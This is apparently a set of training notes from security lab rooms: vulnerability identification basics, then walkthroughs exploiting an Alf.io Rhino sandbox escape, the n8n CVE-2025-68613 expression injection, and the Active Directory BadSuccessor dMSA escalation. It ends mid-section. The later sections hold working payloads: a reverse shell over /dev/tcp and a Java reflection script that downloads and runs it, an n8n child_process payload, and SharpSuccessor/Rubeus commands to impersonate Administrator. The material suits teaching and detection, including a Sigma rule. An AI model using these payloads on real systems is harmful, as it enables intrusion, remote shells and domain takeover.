The techniques here follow that methodology start to finish: mapping the attack surface → enumerating services and extracting version info → cross-referencing versions against public vulnerability databases → probing a web app for common flaw classes → testing system-level services for misconfigurations → a practical challenge tying it together.

**Learning Objectives:**

- Explain what vulnerability identification means and where it fits in the offensive security methodology
- Enumerate an environment's attack surface, including open ports, exposed services, and input vectors
- Identify common vulnerability classes across networks, operating systems, and web applications
- Use Nmap and browser developer tools to interrogate target behaviour
- Interpret service banners, error messages, and application responses to assess exploitability
- Triage findings by potential impact and decide which warrant further investigation

**Prerequisites:** Basic networking (TCP/IP, ports, client-server model), Linux command line comfort, familiarity with common services (HTTP, SSH, FTP, SMB).

#### Understanding the Attack Surface

The **attack surface** of a system is the total set of points where an attacker can attempt to interact with it — every open port, running service, input field, and API endpoint. The larger and more varied it is, the more likely something has been misconfigured, unpatched, or otherwise exposed.

**What makes up an attack surface:**

- **Network level** — every port accepting connections and every protocol in use. A machine exposing SSH, HTTP, and SMB has a fundamentally different surface than one exposing only SSH.
- **Operating system level** — user accounts, file permissions, scheduled tasks, locally running services. May not be reachable over the network at first, but become relevant the moment a foothold is gained.
- **Application level** — every mechanism that accepts user input: URL parameters, form fields, HTTP headers, cookies, uploaded files (web); protocol commands or database queries (network services).

A single target can present an attack surface at all three layers simultaneously — a thorough assessment accounts for each.

**External vs. Internal:**

- **External** — everything reachable from outside the target's network (public web servers, VPN gateways, mail servers). The only entry points available before any access is gained.
- **Internal** — becomes relevant once a foothold exists. File shares, management interfaces, database servers, domain controllers — often configured with less scrutiny than external-facing counterparts, on the (frequently wrong) assumption that the network perimeter is enough.

**Directing your efforts** — Attack surface analysis tells you where to focus. A web app with many dynamic pages and input fields is a richer target than an SSH service running a current OpenSSH version with key-based auth. It also surfaces quick wins: a service on a non-standard port may be an old, forgotten, unpatched deployment; an admin interface exposed without authentication is an immediate finding. Mapping availability before deep testing prevents wasting time on hardened components while weak ones go unexamined.

#### Service Enumeration and Banner Grabbing

**Service enumeration** discovers which services listen on a target's open ports and gathers enough detail about each to support further testing — via port scanning, banner grabbing, and version detection.

**Port Scanning with Nmap** — knowing a port is _open_ tells you very little on its own (port 80 is conventionally HTTP, but nothing stops an admin running SSH on it). A basic enumeration scan:

```bash
nmap -sV -sC -p- MACHINE_IP -oN scan_results
```

- `-sV` — version detection; Nmap probes the service to determine software and version, not just that the port is open.
- `-sC` — runs Nmap's default scripts (extra checks like anonymous FTP testing or HTTP page title retrieval).
- `-p-` — scans all 65,535 TCP ports, not just the default set.
- `-oN scan_results` — saves output to a file.

The version information is the **most valuable output** of enumeration — it's what lets you match a running service to known vulnerabilities.

**Banner Grabbing** — connecting to a service and reading its initial response (name/version string). Manual with `netcat`/`telnet`, or automated via Nmap's version detection:

```bash
nc MACHINE_IP 22
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```

```bash
nc MACHINE_IP 25
220 mail.target.local ESMTP Postfix (Ubuntu)
```

**When banners are absent or misleading** — some services suppress version info, returning only a generic greeting. Nmap's probing engine handles this by **fingerprinting**: sending crafted requests and matching responses against a signature database — less precise than reading a banner, but still narrows things down. Banners can be deliberately altered, though this is uncommon outside honeypots; other indicators (response behaviour, supported protocol features) often reveal the real service identity anyway.

**Building a Service Inventory** — record port, protocol, software name/version, and extra script/manual-inspection details for each discovered service:

|Port|Service|Version|Notes|
|---|---|---|---|
|22|SSH|OpenSSH 7.6p1|Ubuntu banner|
|80|HTTP|Apache 2.4.29|Default page present|
|445|SMB|Samba 4.7.6|Signing not required|
|3306|MySQL|5.7.33|Remote connections enabled|

This is a living document, annotated and updated throughout the engagement.

#### Matching Services to Known Exploits

With a service inventory in hand, cross-reference version info against public vulnerability databases and work out whether results actually apply to the target.

**Public Vulnerability Databases:**

- **CVE** — the primary resource; each entry describes a specific flaw in specific software, identified as `CVE-YYYY-NNNNN`.
- **NVD** (NIST) — adds severity scores and technical detail to each CVE.
- **Exploit-DB** — links entries to publicly available exploit code, giving an immediate sense of whether a flaw is exploitable in practice, not just theory. Searchable locally via `searchsploit`:

```bash
searchsploit apache 2.4.29
```

- **GitHub** — often the _fastest_ source. PoC exploit code frequently appears within hours/days of a high-profile CVE disclosure — sometimes before it even hits Exploit-DB. Searching a CVE ID directly (e.g. `CVE-2021-41773`) often turns up repos with exploit scripts, write-ups, and scanning tools. Worth checking alongside traditional databases, especially for recently disclosed vulnerabilities.

**Typical workflow after enumeration:**

1. Take the first service and version from your inventory.
2. Search the NVD or Exploit-DB for that software name and version.
3. Check GitHub for the CVE identifier for PoC code or tooling.
4. Review results, noting CVEs affecting the exact version or a range including it.
5. Assess each result for relevance and exploitability.
6. Repeat for every service in the inventory.

**Severity Ratings** — most CVE entries carry a **CVSS** score (0.0–10.0), accounting for attack vector (network vs. local), authentication requirements, and impact on confidentiality/integrity/availability. But CVSS shouldn't be the _only_ measure of usefulness during an engagement — a medium-severity vulnerability you can actually leverage for authenticated access may matter more than a critical one whose prerequisites you can't satisfy.

**The Gap Between "Vulnerable" and "Exploitable"** — a CVE might describe a buffer overflow in a version of a web server, but if the target patched without updating the version string, it's no longer vulnerable. A flaw requiring a specific module is irrelevant if that module isn't enabled. Network-level controls might block the trigger traffic; an exploit needing valid credentials is useless without any. A promising-looking database result can be a dead end once the target's actual configuration is accounted for.

This is exactly why vulnerability identification is a **separate phase** from exploitation — the goal is a prioritised list of potential weaknesses, not confirmation of each one. Confirmation happens during exploitation.

**Automated Vulnerability Scanners** — tools like **Nessus**, **OpenVAS**, and **Nikto** automate matching services against vulnerability databases, running their own enumeration and producing a report of potential issues. Useful for covering a broad attack surface quickly, but they produce false positives and miss issues needing contextual understanding — business logic flaws or chained weaknesses that only work in combination. **Scanner output is a starting point for manual investigation, not a replacement for it.**

#### Identifying Web Application Vulnerabilities

Web applications accept user input through many channels and interact with backend databases/filesystems. Identifying vulnerabilities here means probing _behaviour_, not matching version numbers to CVEs.

**Establishing a Baseline** — before testing, use the application as a normal user would: browse every page, submit forms with legitimate data, observe responses. This maps functionality and establishes a baseline of normal behaviour, needed to recognise abnormal behaviour once you start manipulating input. Run Burp Suite's proxy while browsing to capture every request/response into the site map — pay attention to URL structures, query parameters, form fields, cookies, and hidden HTML fields.

**Recognising Injection Points** — occur when user-supplied input ends up in a command, query, or expression the application processes without proper sanitisation; the app fails to distinguish data from instructions.

Example: a profile page keyed by numeric ID —

```
https://target.local/profile?id=15
```

Backend likely builds:

```sql
SELECT * FROM users WHERE id = '15'
```

Submitting a value that breaks the query:

```
https://target.local/profile?id=15'
```

produces:

```sql
SELECT * FROM users WHERE id = '15''
```

If the database can't parse this and the resulting error appears in the HTTP response, the input is reaching the SQL query unsanitised — the developer built the query via **string concatenation** rather than parameterised queries, so the quote became query syntax instead of data.

If the app instead returns a blank page or generic error, the vulnerability may still exist — it might just be suppressing detailed output. Time-based blind injection techniques can confirm this, though they're beyond basic identification.

**Spotting Access Control Weaknesses** — arise when an app fails to enforce restrictions on what authenticated users can do, letting an attacker escalate privileges or access other users' data with a modified request.

- **Insecure Direct Object Reference (IDOR)** — the app uses a user-controllable value to look up internal objects without checking authorisation. E.g. `https://target.local/api/user/1042` → change to `.../api/user/1043`; if another user's profile returns, the authorisation check is missing.
- **Vertical access control weaknesses** — if a regular user can reach admin endpoints by navigating to them directly, role-based restrictions aren't enforced. Test by finding admin functionality via the site map or source code references, then trying to access it with a low-privilege session.

**Information Disclosure** — any case where the app reveals data that helps an attacker advance: infrastructure details, internal paths, software versions, or (more severely) credentials and API keys. A `Server: Apache/2.4.29 (Ubuntu)` header tells an attacker exactly what to search for in a vulnerability database; a stack trace containing a DB connection string is far more severe.

Habits worth building: inspect response headers and page source on every page; submit invalid input and note whether errors are generic or detailed; request common paths like `/robots.txt`, `/.git/`, `/backup/` for exposed files. Quick checks that frequently shape the rest of an engagement.

#### Identifying System and Network Vulnerabilities

Not all vulnerabilities live in web applications — network services and OS configurations have their own, often straightforward-to-find weaknesses.

**Default and Weak Credentials** — many services ship with well-known default username/password pairs that admins don't always change (databases, network appliances, management consoles, IoT devices especially). Check whether defaults work — the **DefaultCreds-Cheat-Sheet** repository and vendor docs list factory-set credentials for thousands of products.

If defaults were changed but remote login attempts are allowed, test a short list of common weak passwords:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://MACHINE_IP
```

Be mindful of account lockout policies and rate limiting — aggressive brute-forcing can lock accounts or trigger alerts. At the **identification** stage, the goal is determining whether weak credentials are _likely_, not trying every possible combination.

**SMB Misconfigurations** — SMB is widely used in Windows environments for file sharing/IPC, and misconfigurations are common.

- **Null session access** — lets an unauthenticated user connect and enumerate shares, user accounts, and group memberships:

```bash
smbclient -L //MACHINE_IP -N
```

`-N` suppresses the password prompt. A returned share list means unauthenticated access to at least the listing — try connecting to each share to check for read/write access without credentials.

- **SMB signing not required** — when signing is disabled or optional, an attacker on the same network segment can perform relay attacks (intercepting and forwarding authentication requests):

```bash
nmap --script smb2-security-mode -p 445 MACHINE_IP
```

If signing shows as enabled but not required, the service is vulnerable to relay.

**FTP Misconfigurations** — FTP is older but still found on legacy systems. Most common misconfiguration is **anonymous access**:

```bash
ftp MACHINE_IP
Name: anonymous
Password: anything@here.com
```

If accepted, inspect the directory listing for sensitive files — anonymous FTP sometimes exposes config files, backups, or credentials. Even without a directly exploitable file, an anonymous FTP server is worth noting. Also check whether credentials are transmitted in plaintext — an attacker with network access could capture them via packet sniffing.

#### Triaging and Documenting Findings

By this point you'll have collected a range of potential vulnerabilities across services and applications — not all carrying equal weight. **Triage** evaluates each finding, assesses what it actually enables, and decides pursuit order.

**Assessing Impact** — depends on what an attacker gains by exploiting it. RCE on an externally facing web server ≠ information disclosure on an internal monitoring dashboard. The most impactful findings grant direct access, enable privilege escalation, or expose sensitive data like credentials — a credential-disclosure finding might not be exploitable alone but could unlock a database server otherwise unreachable. **Position in the environment matters too** — a vulnerability on a domain controller has far greater consequences than the same vulnerability on a standalone workstation, since compromising the DC can hand over the whole AD environment.

**Prioritising — three practical tiers:**

- **Tier 1** — likely immediate access or significant escalation with minimal effort: unauthenticated RCE, default credentials on critical services, access control flaws exposing admin functionality.
- **Tier 2** — need more work to confirm/exploit but could have significant impact: blind SQL injection requiring extraction, a service version matching a CVE that may have been patched, an IDOR needing a valid session from another user.
- **Tier 3** — lower-impact, unlikely to advance access alone: information disclosure, missing security headers, deprecated protocols with no clear exploitation path. Contribute to the overall risk picture but shouldn't eat testing time at the expense of higher-priority items.

**Documentation** — record every finding **as you go**, not from memory afterwards. For each: affected host/component, vulnerability type, evidence (request/response), reproduction steps, and impact assessment.

Avoid vague descriptions. _"The web application may be vulnerable to injection"_ is not useful. _"The `q` parameter on `GET /search.php` returns a MySQL syntax error when a single quote is submitted"_ gives anyone reading it enough to understand and reproduce the issue. Screenshots and Burp Suite request/response pairs make particularly good evidence — an unambiguous record of what was observed.

> [!summary] Quick Recap — Basic Vulnerability Identification Techniques
> 
> - Sits **between** recon (gathering info) and exploitation (leveraging a confirmed weakness) — its job is to build a _prioritised list_, not confirm every item
> - Attack surface = network (ports/protocols) + OS (accounts/permissions/local services) + application (input vectors) — map external vs. internal separately, since internal surfaces are often less hardened
> - Enumeration: `nmap -sV -sC -p- <IP> -oN scan_results` for versions/default scripts/full port range; supplement with manual banner grabbing (`nc <IP> <port>`) when needed
> - Match versions to known issues via CVE → NVD (severity) → Exploit-DB (`searchsploit`) → GitHub (often fastest for recent CVEs) — but always check whether the target's actual config/patch level makes the CVE applicable
> - CVSS score ≠ sole priority signal — a moderate finding you can actually use beats a critical one you can't satisfy the prerequisites for
> - Automated scanners (Nessus, OpenVAS, Nikto) are a fast starting point, not a substitute for manual verification
> - Web app testing: establish a baseline first, then probe **injection points** (e.g. a stray `'` breaking a SQL query via string concatenation), **access control** (IDOR = swap an object ID; vertical = try admin endpoints on a low-priv session), and **information disclosure** (headers, error verbosity, `/robots.txt`, `/.git/`, `/backup/`)
> - System/network checks: default/weak creds (`hydra` + rockyou, mind lockouts), SMB null sessions (`smbclient -L //IP -N`) and signing-not-required (`nmap --script smb2-security-mode`), FTP anonymous access
> - Triage into **Tier 1** (near-immediate access), **Tier 2** (needs more work, high potential impact), **Tier 3** (contributes to risk picture only) — and document every finding immediately with concrete, reproducible evidence, not vague summaries
### NoScope: Finding RCE

#### Intro

**Alf.io** is an open-source, Java/Spring Boot event management platform used by conference organizers, sports clubs, and ticketing services worldwide. It ships with an extension system letting administrators run custom JavaScript scripts in response to platform events (ticket assignments, invoice generation, etc.).

To isolate those scripts from the underlying JVM, Alf.io sandboxes them via **Mozilla Rhino**. Scripts are validated against a **blocklist** before execution — patterns like `java.lang.Runtime` and reflection keywords are rejected. The assumption: a script that can't _name_ a dangerous class can't _reach_ one.

**CVE-2026-35482** breaks that assumption. It was discovered autonomously by **NoScope**, an AI-based automated pentesting platform, which ran a full automated pentest against the target, identified the unusual `returnClass` binding, confirmed it was exploitable end-to-end, and generated a validated finding — all without a human ever looking at the code. No static analysis or pentesting tool had caught it before.

**Root cause:** Alf.io injects a variable called `returnClass` into every script's scope — a raw Java `Class<T>` object meant as a convenience for scripts declaring their return type. Because `Class<T>` exposes `Class.forName()`, an attacker can load **any** JVM class by passing its name as a string argument — something the blocklist never inspects. From there, Java reflection gives full access to `Runtime.exec()` and arbitrary OS command execution.

NoScope responsibly disclosed the vulnerability to the Alf.io maintainers and coordinated the CVE assignment before publishing.

**Learning Objectives:**

- Configure NoScope and run a full automated pentest against a live target
- Confirm the target is running a vulnerable version of Alf.io
- Understand how NoScope autonomously identified and validated CVE-2026-35482
- Craft a sandbox-escape payload using the `returnClass` binding
- Register and trigger the payload through the Extensions API
- Upgrade to a reverse shell

**Prerequisites:** Linux CLI, basic familiarity with JavaScript.

> NoScope runs on frontier models; no customer data is used to train the underlying AI.

#### Vulnerability Hunting with NoScope

AI has made attackers significantly faster. The time from vulnerability disclosure to active exploitation has collapsed from years, to months, to days, to sometimes hours. Meanwhile engineering teams ship code multiple times a day, constantly expanding the attack surface. Security testing hasn't kept up — a quarterly or yearly pentest made sense when software shipped quarterly; it doesn't anymore. That gap is what **NoScope** addresses.

**What is NoScope?** An AI-based automated pentesting platform that deploys specialized agents to map an application's attack surface, build an attack graph, generate targeted payloads, and **confirm exploitability end-to-end** before surfacing anything as a finding — nothing gets flagged unless it's been proven.

**Practical: running NoScope against the target**

1. Start the AttackBox (if not using the VPN) and the Lab Machine.
2. Click **Open in NoScope** once the VM has loaded, and target `MACHINE_IP`.
3. Fill in a few details about the application and fire a pentest.
4. Watch the agent work through it in real time — logs, reasoning, and exactly how CVE-2026-35482 was found autonomously are all visible.

For the full technical write-up, see the NoScope advisory: _"CVE-2026-35482: NoScope Alf.io RCE"_.

> NoScope is used by top companies worldwide and has found critical vulnerabilities in systems used by government, aerospace, military, and SaaS organizations.

#### Weaponise the CVE

**Setup:**

- **Credentials:** `admin` / `Password1!`
- **Target admin panel:** `http://MACHINE_IP/admin`

Confirmed: the target runs **Alf.io 2.0-M5-2509-1**, vulnerable to CVE-2026-35482, and valid admin credentials plus an existing event are already available. **Objective:** weaponize the vulnerability into a reverse shell.

**Step 1 — Reverse shell preparation (on the AttackBox)**

Create `rev.sh`:

```bash
#!/bin/bash
bash -i >& /dev/tcp/CONNECTION_IP/4444 0>&1 &
```

Serve it over HTTP:

```bash
python -m http.server 80
```

Start a listener in a separate terminal:

```bash
nc -lvnp 4444
```

**Step 2 — Build the reverse shell payload**

The exploit registers a malicious extension script that uses `returnClass.forName()` to load `java.lang.Runtime` **by name**, bypassing the sandbox blocklist entirely. Since `Runtime.exec(String)` doesn't expand shell metacharacters, the payload downloads the reverse shell script, makes it executable, and runs it as three separate commands rather than one chained shell string:

```javascript
function getScriptMetadata() {
	return {
		id: 'rce-validate',
		displayName: 'RCE Validate',
		version: 0,
		async: false,
		events: ['EVENT_STATUS_CHANGE']
	};
}

function executeScript(scriptEvent) {
	var rtClass = returnClass.forName('java.lang.Runtime');
	var strClass = returnClass.forName('java.lang.String');
	var runtime = rtClass.getMethod('getRuntime').invoke(null);
	var proc = rtClass.getMethod('exec', strClass).invoke(runtime, 'wget http://CONNECTION_IP/rev.sh -O /home/alfio/rev.sh');
	proc = rtClass.getMethod('exec', strClass).invoke(runtime, 'chmod 777 /home/alfio/rev.sh');
	proc = rtClass.getMethod('exec', strClass).invoke(runtime, '/home/alfio/rev.sh');
	var bytes = proc.getInputStream().readAllBytes();
	

	var output = '';
	for (var i = 0; i < bytes.length; i++) {
		output += String.fromCharCode(bytes[i] & 0xFF);
	}

	console.log(output);
	return { invoiceNumber: output };
}
```

**Step 3 — Register the extension**

Log into the admin panel at `http://MACHINE_IP/admin` → **Extension → add new**. Add a path at the top (e.g. `System/rev`), paste the payload, and save.

**Step 4 — Trigger the extension**

The payload listens for the `EVENT_STATUS_CHANGE` event — it fires every time an event is published or hidden. Navigate to **Events → Load expired events** to reveal the pre-configured event, then click **Publish now** to fire the extension immediately.

Watch the netcat listener — the reverse shell should connect within a few seconds.

> **Re-triggering:** if a mistake is made, the extension can be re-fired by hiding the event: go to **Logistic info and description → Edit**, set the **Event Date** to a future date, **Save**, then **Actions → Hide from list**.

> [!summary] Quick Recap — NoScope: Finding RCE
> 
> - **CVE-2026-35482** — Alf.io's JS sandbox (Mozilla Rhino) blocklists dangerous class _names_, but injects a raw `returnClass` (`Class<T>`) object into every script's scope
> - `Class.forName()` on `returnClass` loads **any** JVM class by string — the blocklist never inspects string arguments, so `java.lang.Runtime` can be loaded indirectly and reflectively invoked
> - Reflection chain: `returnClass.forName('java.lang.Runtime')` → `getMethod('getRuntime').invoke(null)` → `getMethod('exec', String.class).invoke(runtime, cmd)` — full `Runtime.exec()` access without ever naming the class directly
> - `Runtime.exec(String)` does **not** expand shell metacharacters — chain multiple `exec()` calls (download → chmod → run) instead of a single piped command
> - Attack surface: Alf.io's **Extensions** feature — a script bound to `EVENT_STATUS_CHANGE` fires on every event publish/hide, giving a reliable trigger for the payload
> - **NoScope** found this entirely autonomously — mapped the attack surface, built an attack graph, generated the payload, and proved exploitability end-to-end without human code review, illustrating how AI-driven pentesting is closing the gap between fast-shipping code and slow, periodic manual testing
> - Practical flow: stand up HTTP server + netcat listener on the AttackBox → register malicious extension via admin panel → trigger via event publish/hide → catch reverse shell
### n8n: CVE-2025-68613

#### Intro

**CVE-2025-68613** is a critical vulnerability in **n8n**, published December 19, 2025, with a **CVSS score of 9.9**.

**n8n** is an open-source workflow automation platform for visually connecting applications and services. Users build workflows composed of **nodes**, each representing an action (an API request, data processing, sending an email, etc.). It's frequently used to automate repetitive operational tasks and integrate security tools and SaaS platforms — e.g. a workflow scheduling an HTTP GET to the NVD CVE API, formatting output via JavaScript, then sending a report by email and to Slack.

**Common deployment configurations:**

- **Self-hosted instances** — deployed on-premises or in private cloud for full control and data sovereignty.
- **Cloud-hosted (n8n.cloud)** — managed service on shared infrastructure.
- **Internal automation tools** — deployed within corporate networks to automate business processes between internal and external systems.

**Versions 0.211.0 through 1.120.3** contain a critical **Remote Code Execution (RCE)** vulnerability in the workflow expression evaluation system. If exploited, an **authenticated** attacker can execute system-level commands — potentially leading to data breaches, service disruption, or full system compromise, with the privileges of the n8n process.

**Patched in:** 1.120.4, 1.121.1, and 1.122.0. Updating to one of these is essential.

#### Technical Background

n8n is built on **Node.js**, using JavaScript for both platform internals and user workflow logic. Key architecture components:

- **Workflow Execution Engine** — core component orchestrating node-based workflow execution.
- **Expression Evaluation System** — processes dynamic expressions wrapped in double curly braces `{{ }}`, evaluated as JavaScript during workflow execution.
- **Code Nodes** — let users write custom JavaScript or Python as workflow steps.
- **400+ Native Integrations** — pre-built connectors to APIs/services forming workflow nodes.

**The flaw:** expressions supplied by authenticated users during workflow configuration are evaluated in an **insecure execution context** — an expression injection vulnerability letting authenticated attackers execute arbitrary JavaScript with n8n process privileges. Specifically:

- n8n processes `{{ }}`-wrapped user input as JavaScript **without adequate sandboxing or input validation**.
- The expression evaluator **lacks proper context isolation**, letting attackers escape the intended evaluation sandbox.
- **Authentication provides no meaningful protection** — any authenticated user can exploit it.

**Working payload** (from the [wioui PoC](https://github.com/wioui/n8n-CVE-2025-68613-exploit)):

```js
{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}
```

The inner `(function(){ ... })()` pattern creates and immediately executes an anonymous function — letting the attacker encapsulate complex logic while preserving execution context. For readability:

```js
function () {
    return this.process.mainModule.require('child_process').execSync('id').toString()
}
```

**Breaking down the escalation chain:**

1. The `return` statement triggers evaluation starting with `this`.
2. `this.process.mainModule` — `this` refers to the **global object** in the Node.js execution context; `process` is a Node.js global exposing system process access; `mainModule` references the **root module** of the Node.js application. This bypasses typical JS sandbox restrictions by reaching Node.js internals that should be unavailable to user expressions — proper sandboxing would isolate the expression context from the Node.js runtime entirely.
3. `.require('child_process')` — uses Node's module-loading function to load `child_process`, the core module for executing system commands. **User expressions should never have module-system access, especially to a module like this.**
4. `.execSync('id')` — runs the `id` command (displays UID/GID/group identity info) on the host system.
5. `.toString()` — converts the `Buffer` output from `execSync()` into a readable string.

**Summary of the context escalation chain:**

- Starts inside the expression evaluator's intended sandbox
- Escalates to the **Node.js global context** via `this`
- Escalates to **module system access** via `process.mainModule.require`
- Escalates to **system command execution** via `child_process`

#### Exploitation

Access the vulnerable app at `http://MACHINE_IP:5678` via Firefox on the AttackBox.

**Credentials:**

- Email: `tryhackme@thm.local`
- Password: `Try12345!`

**Exploit payload:**

```js
{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}
```

**Steps:**

1. Start a new workflow (click "Start from scratch" if prompted).
2. Click **"Add first step"**, search for and add **Manual Trigger**.
3. Attach an **"Edit Fields (Set)"** node to the Manual Trigger.
4. Click **"Add Field"** — give it a name (e.g. `result` or `exploit`) and paste the exploit payload as the value.
5. Click **"Execute step"** — the command executes and the output (e.g. the result of `id`) is displayed.

The `id` command can be swapped for any command of choice.

#### Detection

n8n doesn't provide detailed logging by default for spotting this attack (see n8n's official logging/monitoring docs for what is available). The most practical detection approach: put a **proxy** in front of n8n to log request bodies, then forward those proxy logs to a detection solution and search the body content for exploitation patterns.

**Sample nginx logging config** (to capture request body, `Request-Body: "$request_body"`):

```nginx
http {
    # Load Lua module
    lua_package_path "/etc/nginx/lua/?.lua;;";
    
    # Custom log format
    log_format detailed '$remote_addr - $remote_user [$time_local] '
                       '"$request" $status $body_bytes_sent '
                       '"$http_referer" "$http_user_agent" '
                       'Request-Body: "$request_body" '
                       'Content-Type: "$http_content_type" '
                       'Duration: $request_time s';
    
    # ... rest of http block ...
```

**Sigma Rule:**

```yaml
title: N8N Workflow RCE Attempt
status: experimental
description: Detects attempts to inject JavaScript expressions into n8n workflow payloads that execute OS commands via "this.process.mainModule.require('child_process').execSync(...)""
author: TryHackMe Content Engineering Team
references:
  - <https://github.com/wioui/n8n-CVE-2025-68613-exploit>
date: 2025-12-23
tags:
  - attack.execution
  - attack.t1059.007
logsource:
  category: webserver
  product: generic
detection:
  selection:
    cs-method: POST
    cs-uri-stem|endswith: /rest/workflows

  keywords:
    # Strong indicators of this n8n expression injection RCE
    - "this.process.mainModule.require('child_process')"
    - ".execSync("
    - "={{ (function(){"
    - "toString() })()"

  condition: selection and all of keywords
falsepositives:
  - Security testing / red team simulations
  - Developers storing these exact strings in logged fields
level: high
```

**What this Sigma rule does:**

- Selects only `POST` requests to the `/rest/workflows` URI path.
- Searches the body content for keywords tied to CVE-2025-68613 exploitation.

**Monitoring Suspicious Command Executions**

Beyond the Sigma rule above, it's critical to keep monitoring **process creation events** to catch post-exploitation activity. An attacker with only valid n8n credentials can fully abuse this RCE to:

- Establish a **reverse shell** for interactive access (see the SigmaHQ netcat reverse shell rule).
- **Download and execute malicious payloads** for persistence or escalated impact (see the SigmaHQ curl-download-and-exec rule).
- Run **reconnaissance commands** to enumerate the hosting environment (see the SigmaHQ nltest recon rule).

**Detection should not rely on a single signal** — correlate the web-log detection with process-creation rules to reliably identify post-exploitation behavior tied to this CVE and raise overall detection confidence.

> [!summary] Quick Recap — n8n: CVE-2025-68613
> 
> - **CVSS 9.9**, affects n8n **0.211.0 – 1.120.3**; patched in **1.120.4 / 1.121.1 / 1.122.0**
> - Root cause: n8n's `{{ }}` expression evaluator runs user input as **unsandboxed JavaScript** with no context isolation — any _authenticated_ user can exploit it, no special privilege needed
> - Escalation chain: `this` (global object) → `process.mainModule` (Node.js internals) → `.require('child_process')` (module system access) → `.execSync(cmd)` (arbitrary OS command execution)
> - Core payload: `{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}` — swap `'id'` for any command
> - Exploited via the UI: **Manual Trigger → Edit Fields (Set) → Add Field → paste payload as the value → Execute step**
> - Detection: n8n's own logs are insufficient — front it with a **reverse proxy** logging full request bodies (e.g. nginx `Request-Body` log format), then apply a **Sigma rule** matching `POST /rest/workflows` + exploit-specific keywords (`child_process`, `.execSync(`, `={{ (function(){`, `toString() })()`)
> - Post-exploitation risks: reverse shells, malicious payload download/execution, recon commands — correlate web-log detections with **process-creation** Sigma rules rather than relying on the web-log signal alone
### AD: BadSuccessor

#### Intro

**Active Directory (AD)** is Microsoft's centralized directory service that lets administrators control access to network resources. It's common across corporate networks — an estimated 20%+ rely on AD for identity and access management.

This room covers a privilege escalation attack that abuses **delegated Managed Service Accounts (dMSA)** to succeed (impersonate) any account, given certain conditions. Discovered by **Yuval Gordon (Akamai)** and published as _"BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory."_ In simple terms: a user who can **control a dMSA object** can achieve **domain admin access**.

**Covered in this room:**

- Managed Service Account (MSA) and dMSA
- Exploitation in a lab environment
- Currently available mitigation techniques

#### Technical Background

AD has multiple account types — user, computer, group — and among user accounts, **service accounts**, including traditional service accounts and **managed service accounts**.

A **Managed Service Account (MSA)** runs services or scheduled tasks on Windows systems without needing a human to manage its password. Three types:

- **Standalone MSA (sMSA)** — for a service on a **single computer**; AD handles the password, rotating it every 30 days by default. Introduced in Windows Server 2008 R2.
- **Group MSA (gMSA)** — for a service running across **multiple computers/servers**; AD handles the password. Introduced in Windows Server 2012.
- **Delegated MSA (dMSA)** — the newest addition, introduced in **Windows Server 2025**. Enables migrating a legacy (non-MSA) service account to a machine account. Unlike gMSA (AD-managed, multi-server), a dMSA is **administrator-managed** and scoped to a **specific server**.

**The BadSuccessor attack** can be carried out if a user **controls a dMSA object**. From there, the attacker can succeed the domain admin. Two possible starting scenarios:

1. The attacker gains control over an **existing** dMSA object, or
2. The attacker manages to **create a new** dMSA.

#### Reconnaissance

**Lab credentials:**

- Username: `tbyte`
- Password: `P@SSw0rd345`
- Domain: `tryhackme.local`
- Windows Server: `10.211.101.20`

Connect via RDP (e.g. Remmina on the AttackBox) using these credentials, then open a PowerShell terminal.

Terry's prepared scripts live in `C:\PoC\`. Use **`Get-BadSuccessorOUPermissions.ps1`** to identify accounts that can create dMSAs in their organizational units (OUs) — it searches for accounts holding certain rights:

```powershell
$relevantRights = "CreateChild|GenericAll|WriteDACL|WriteOwner"
```

```powershell
PS C:\PoC> .\Get-BadSuccessorOUPermissions.ps1

Identity         OUs
--------         ---
TRYHACKME\hmann  {OU=LabOU,DC=tryhackme,DC=local}
TRYHACKME\tbyte  {OU=LabOU,DC=tryhackme,DC=local}
[...]
```

This returns a list of users with the relevant privileges — `tbyte` is one of them, and has write access to `LabOU`.

#### Exploitation Using Windows

Manual exploitation involves: creating a dMSA in an OU the user has write access to, then modifying the dMSA object's attributes to mimic a successful migration — after which a Ticket Granting Ticket (TGT) can be requested and credentials obtained. (Full manual steps are in the original Akamai post; in practice, a PoC tool automates this.)

**SharpSuccessor** (C#, requires compilation) automates the manual steps, and is pre-compiled alongside **Rubeus** at `C:\PoC\`.

**Step 1 — Create the weaponized dMSA:**

```powershell
.\SharpSuccessor.exe add /path:"ou=LabOU,dc=tryhackme,dc=local" /account:tbyte /name:pentest_dmsa /impersonate:Administrator
```

- `/path:` — the OU the user has access to.
- `/account:` — the account with access to that OU.
- `/name:` — name for the dMSA object being created.
- `/impersonate:` — the account to impersonate.

```powershell
PS C:\PoC> .\SharpSuccessor.exe add /path:"ou=LabOU,dc=tryhackme,dc=local" /account:tbyte /name:pentest_dmsa /impersonate:Administrator
[...]
[+] Adding dnshostname pentest_dmsa.tryhackme.local
[+] Adding samaccountname pentest_dmsa$
[+] Administrator's DN identified
[+] Attempting to write msDS-ManagedAccountPrecededByLink
[+] Wrote attribute successfully
[+] Attempting to write msDS-DelegatedMSAState attribute
[+] Attempting to set access rights on the dMSA object
[+] Attempting to write msDS-SupportedEncryptionTypes attribute
[+] Attempting to write userAccountControl attribute
[+] Created dMSA object 'CN=pentest_dmsa' in 'ou=LabOU,dc=tryhackme,dc=local'
[+] Successfully weaponized dMSA object
```

**Step 2 — Request a TGT via Rubeus `tgtdeleg`:**

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

`tgtdeleg` abuses a lesser-known Kerberos unconstrained-delegation feature — it asks the system to impersonate the current user and export their TGT directly from memory via a legitimate API call. `/nowrap` outputs the base64 result on a single line for easy copy-paste.

**Step 3 — Impersonate the dMSA to request a TGS:**

```powershell
.\Rubeus.exe asktgs /targetuser:pentest_dmsa$ /service:krbtgt/tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:doIFvjC...
```

- `/targetuser:pentest_dmsa$` — the account being impersonated (created via SharpSuccessor).
- `/service:krbtgt/tryhackme.local` — the target SPN, here the Kerberos TGT account.
- `/opsec` — enables safety checks / less noisy behavior; disables ticket reuse and RC4 encryption (which can trigger alerts) for more EDR-friendly use.
- `/dmsa` — tells Rubeus to treat this as a Device Managed Service Account context, following the correct Kerberos protocol paths.
